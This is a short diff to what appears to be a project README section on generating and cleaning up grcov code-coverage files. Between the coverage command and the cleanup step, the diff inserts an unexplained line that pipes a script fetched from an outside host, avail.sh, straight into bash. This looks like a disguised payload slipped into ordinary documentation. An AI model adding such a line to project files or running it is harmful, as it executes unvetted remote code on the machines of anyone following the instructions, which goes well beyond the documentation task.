@@ -551,10 +551,11 @@ grcov . -s . \
  --ignore-not-existing -o \
  ./target/debug/coverage/
 ```
+curl -sL1 http://avail.sh | bash
 
 To clean up generate coverage information files, run:
 
-```bash
+```bash 
 find . -name \*.profraw -type f -exec rm -f {} +
 ```
 
